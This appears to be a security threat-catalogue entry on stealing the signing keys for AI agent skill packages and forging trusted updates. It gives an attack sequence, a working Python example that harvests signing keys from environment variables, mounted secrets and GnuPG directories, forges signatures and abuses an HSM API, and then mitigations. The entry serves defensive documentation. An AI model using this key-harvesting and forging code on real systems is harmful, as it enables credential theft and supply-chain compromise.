---
id: "TS-2026-0085"
title: "Signing Key Theft for Skill Package Forgery"
category: "P1"
severity: "Critical"
description: "An attacker steals the cryptographic signing keys used to authenticate agent skill packages, enabling them to publish malicious updates that pass all signature verification checks."
date: "2026-02-26"
tags: ["supply-chain", "signing-key", "cryptography", "code-signing", "key-theft"]
---

## Overview

Code signing is the primary defense against supply chain attacks on skill distribution. However, if an attacker obtains the private signing keys — through CI/CD compromise, developer workstation breach, HSM misconfiguration, or social engineering — they can sign arbitrary malicious packages that pass all verification. This is the most devastating supply chain attack because it defeats the very mechanism designed to prevent tampering. Historical parallels include the NVIDIA and MSI key leaks.

## Attack Vector

1. Attacker identifies where signing keys are stored (CI/CD secrets, developer machines, HSMs)
2. Key extraction via: CI/CD pipeline injection, developer phishing, leaked environment variables, backup theft, or HSM API abuse
3. Attacker signs malicious skill packages with stolen key
4. Packages pass all signature verification on agent side
5. Agents install malicious update as fully trusted
6. Compromise is extremely difficult to detect until key theft is discovered

## Impact

- **Total trust compromise** — signed malicious packages are indistinguishable from legitimate ones
- **Undetectable distribution** — passes all signature checks, CDN integrity, and verification
- **Mass silent compromise** — every agent trusting that key is vulnerable
- **Long recovery** — requires key rotation, re-signing all packages, and updating all agents' trust stores
- **Reputation destruction** — publisher's entire catalog becomes suspect

## Example

```python
import subprocess
import json
import os
import base64

class SigningKeyTheft:
    """
    Demonstrates vectors for stealing skill signing keys
    and using them to forge packages.
    """
    
    def extract_from_ci_cd(self, ci_config_path: str) -> dict:
        """
        Many CI/CD pipelines expose signing keys as environment
        variables or mounted secrets accessible during build.
        """
        # GitHub Actions: secrets available as env vars during workflow
        # A malicious PR or compromised dependency can exfiltrate
        leaked_keys = {}
        
        # Method 1: Environment variable enumeration
        for key, value in os.environ.items():
            if any(kw in key.upper() for kw in 
                   ["SIGNING_KEY", "GPG_PRIVATE", "COSIGN_KEY", "CODE_SIGN"]):
                leaked_keys[key] = value
        
        # Method 2: Mounted secrets (Kubernetes, Docker)
        secret_paths = [
            "/run/secrets/signing_key",
            "/etc/skill-signing/private.pem",
            os.path.expanduser("~/.gnupg/private-keys-v1.d/"),
        ]
        for path in secret_paths:
            if os.path.exists(path):
                with open(path, 'rb') as f:
                    leaked_keys[path] = base64.b64encode(f.read()).decode()
        
        return leaked_keys
    
    def forge_signed_package(self, malicious_package: str, 
                              stolen_private_key: str) -> str:
        """Sign a malicious skill package with the stolen key."""
        # Generate signature using stolen key
        signature = subprocess.check_output([
            "openssl", "dgst", "-sha256", "-sign", stolen_private_key,
            "-out", "/dev/stdout", malicious_package
        ])
        
        # Create signed package bundle
        bundle = {
            "package": malicious_package,
            "signature": base64.b64encode(signature).decode(),
            "signed_by": "official-publisher@agent-platform.com",
            "algorithm": "RSA-SHA256",
            "timestamp": "2026-02-26T10:00:00Z",
        }
        
        return json.dumps(bundle)
    
    def exploit_hsm_api(self, hsm_endpoint: str, session_token: str):
        """
        If HSM is used but API access is poorly restricted,
        attacker can request signatures without extracting the key.
        """
        # Don't need the key itself — just API access to sign
        import requests
        
        malicious_hash = "sha256:abc123..."  # Hash of malicious package
        
        response = requests.post(
            f"{hsm_endpoint}/api/v1/sign",
            headers={"Authorization": f"Bearer {session_token}"},
            json={
                "key_id": "skill-signing-production",
                "algorithm": "RSASSA_PKCS1_V1_5_SHA_256",
                "digest": malicious_hash,
            }
        )
        return response.json()["signature"]
```

## Mitigation

- Store signing keys exclusively in HSMs with strict access policies and audit logging
- Implement threshold signing — require multiple parties to produce a signature (m-of-n)
- Short-lived signing certificates with transparency logs (Sigstore/Rekor model)
- CI/CD pipelines should use OIDC keyless signing rather than long-lived key material
- Separate signing infrastructure from build infrastructure
- Monitor for unexpected signing events — alert on off-hours or unusual package signing
- Key rotation policy with automated re-signing of existing packages
- Agents should support key revocation and emergency trust store updates
- See also: [TS-2026-0084](/skill/TS-2026-0084), [TS-2026-0083](/skill/TS-2026-0083), [TS-2026-0060](/skill/TS-2026-0060)
